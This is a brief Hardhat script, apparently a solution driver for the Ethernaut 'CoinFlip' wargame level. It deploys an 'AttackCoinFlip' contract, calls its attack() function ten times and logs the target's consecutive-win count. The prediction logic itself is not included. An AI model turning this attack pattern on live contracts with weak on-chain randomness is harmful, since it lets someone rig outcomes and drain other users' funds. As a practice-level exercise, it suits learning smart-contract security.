import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xd79Df1927718b3212FA6E126Ec4Ad2b3Ee1263D9"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("CoinFlip", CONTRACT_ADDRESS, signer)

    const CoinFlipAttackContract = await ethers.getContractFactory("AttackCoinFlip", signer)
    const coinFlipAttack = await CoinFlipAttackContract.deploy(CONTRACT_ADDRESS)
    await coinFlipAttack.deployed()

    console.log("Attack contract deployed at: ", coinFlipAttack.address);
    
    for (let i = 0; i < 10; i++) {
        await coinFlipAttack.attack()
        const wins = await contract.consecutiveWins()
        console.log("Current win count: ", wins.toString());
        
    }
}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});